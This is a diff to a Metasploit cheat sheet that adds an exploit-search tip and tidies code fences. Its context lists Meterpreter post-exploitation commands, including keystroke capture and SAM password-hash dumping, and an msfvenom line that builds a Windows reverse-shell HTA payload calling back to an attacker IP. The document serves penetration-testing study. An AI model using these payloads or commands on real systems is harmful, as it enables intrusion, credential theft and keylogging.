@@ -1,5 +1,9 @@
 # Metasploit
 
+## Search for an exploit
+
+- `search exploit name`
+
 ## Catch a shell with meterpreter
 
 ### Generate shell with msfvenom:
@@ -25,7 +29,8 @@ Set `LHOST` and `LPORT` and `run` to catch the shell
 ### Meterpreter Commands
 
 You can see this when typing `help`
-```
+
+```bash
 meterpreter > help
 
 Core Commands
@@ -41,11 +46,12 @@ Core Commands
     bgrun                     Executes a meterpreter script as a background thread
     channel                   Displays information or control active channels
 ```
+
 Note: the commands can change depending on your version of meterpreter
 
 #### Core commands
 
-```
+```bash
 background: Backgrounds the current session
 exit: Terminate the Meterpreter session
 guid: Get the session GUID (Globally Unique Identifier)
@@ -60,7 +66,7 @@ sessions: Quickly switch to another session
 
 #### File system commands
 
-```
+```bash
 cd: Will change directory
 ls: Will list files in the current directory (dir will also work)
 pwd: Prints the current working directory
@@ -74,7 +80,7 @@ download: Will download a file or directory
 
 #### Networking commands
 
-```
+```bash
 arp: Displays the host ARP (Address Resolution Protocol) cache
 ifconfig: Displays network interfaces available on the target system
 netstat: Displays the network connections
@@ -96,7 +102,7 @@ sysinfo: Gets information about the remote system, such as OS
 
 #### Others Commands
 
-```
+```bash
 idletime: Returns the number of seconds the remote user has been idle
 keyscan_dump: Dumps the keystroke buffer
 keyscan_start: Starts capturing keystrokes
@@ -132,7 +138,7 @@ hashdump: Dumps the contents of the SAM database
 
 ### Create the payload with msfvenom
 
-```
+```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP-OF-ATTACK-MACHINE LPORT=443 -f hta-psh -o payload.hta
 ```
 
